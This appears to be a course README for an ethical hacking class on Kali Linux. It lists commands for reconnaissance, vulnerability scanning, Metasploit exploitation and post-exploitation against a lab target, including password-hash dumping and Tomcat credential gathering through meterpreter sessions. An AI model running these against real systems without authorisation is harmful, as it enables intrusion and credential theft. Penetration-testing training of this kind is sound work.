# Ethical Hacking 101 with Kali Linux

## Module 01: Setting Up the environment

```
chmod +x provision.sh
./provision.sh
```

## Module 02: Information Gathering

### Tools for Passive Reconnaissance

### nslookup

```
nslookup microsoft.com
```

### netdiscover

```
netdiscover
```

### host
```
host microsoft.com
```

### dig

```
dig microsoft.com
dig MX microsoft.com
```

### whois

```
whois nmap.org
```

### exiftool

```
exiftool -h
```

### theharvester

```
theHarvester.py -d microsoft.com -b bing -l 5 > result.txt
```

### maltego

```bash
maltego
```

### recon-ng

```bash
recon-ng
```


### Tools for Active Reconnaissance

### dirb

```bash
dirb http://$MS2/
```




### httrack

```bash
httrack http://$MS2/ -O /copyweb
```

### nmap

#### Ping Sweep Scan

```bash
nmap -sP $NETRANGE
```

#### TCP Full Scan

```bash
nmap -sT $MS2 -oA nmap-output
```

#### TCP Full Scan

```bash
nmap -sT $MS2 -oA nmap-output-fullscan
```

#### Steath Scan

```bash
nmap -sS $MS2 -oA nmap-output-steathscan
```

#### Version Scan

```bash
nmap -sV $MS2 -oA nmap-output-versionscan
```

#### Other Commands

```bash
nmap -F $MS2

nmap -sn $MS2

nmap -Pn $MS2
 
nmap -p 1-200 $MS2

echo $MS2 > nmap-input-file.txt
nmap -iL -sT

nmap --script discover,safe $MS2
```

### enum4linux

```bash
enum4linux $MS2 > enum4linux-output.txt
```

### cewl

```bash
cewl http://$MS2/dvwa -w words.txt
```

### Open Source Intelligence Sources
#### Netcraft https://www.netcraft.com/
#### Haveibeenpwned https://haveibeenpwned.com/
#### SHODAN https://www.shodan.io
#### Censys https://censys.io/

### Dimitry

```bash
dmitry -s $DOMAIN_NAME
```

### Wafw00f

```bash
wafw00f http://$MS2
```


### Recon-ng

```bash
recong-ng
```

## Module 03: Vulnerability Assesment

### Nmap Vulnerability Scan

```bash
nmap --script vuln $MS2
```


### Skipfish

```bash
skipfish -o mutillidae http://$MS2/multillidae
```

### GVM (OpenVAS)

Execute the following commands to reset the admin password:

```bash
sudo runuser -u _gvm -- gvmd --user=admin --new-password=PASSWORD
```

Grating permission to ospd to the default scanner

```bash
sudo runuser -u _gvm -- gvmd --get-scanners
```

You will need to get the ID from the OpenVAS Default 

```bash
sudo runuser -u _gvm -- gvmd --modify-scanner=<ID_OF_SCANNER> --scanner-host=/var/run/ospd/ospd-openvas.sock
```

Modify Redis 

```bash
sudo cat /etc/redis/redis-openvas.conf | grep unixsocket
```

```bash
echo "db_address = /var/run/redis-openvas/redis.sock" | sudo tee /etc/openvas/openvas.conf
```

Start the GVM (OpenVAS) service

```bash
sudo gvm-start
```


## Module 04: Exploitation
Metasploit uses postgresql as detault database, remember to start the postgresql server

```bash
service postgresql start
```

Use automation scripts with metasploit

```bash
msfconsole -q -r exploits/exploit_01_vsftpd.rc
```

Export records from database to a XML file

```bash
msfconsole -q -x "db_export -f xml /root/msf_results.xml"
```

## Module 05: Post-Exploitation

You need to have an active **meterpreter** session, review exploit/exploit_04

```bash
msfconsole -q
``` 

Check active sessions

```
msf5 exploit(multi/misc/java_rmi_server) > sessions -l
```

**checkVM**: This will check if the compromise machine is a Virtual Machine or not

```
msf5 exploit(multi/misc/java_rmi_server) > use post/linux/gather/checkvm
msf5 post(linux/gather/checkvm) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/checkvm) > run
```

**hashdump**:

```
msf5 post(linux/gather/checkvm) > use post/linux/gather/hashdump 
msf5 post(linux/gather/hashdump) > set SESSION 1
SESSION => 1
msf5 post(linux/gather/hashdump) > run
```

**tomcat_gather**:
```
msf5 post(linux/gather/hashdump) > use post/multi/gather/tomcat_gather 
msf5 post(multi/gather/tomcat_gather) > set SESSION 1
SESSION => 1
msf5 post(multi/gather/tomcat_gather) > run
```


## Module 06: Reporting

### Dradis

Execute the command and visit http://localhost:3000 with your browser

```bash
service dradis start
```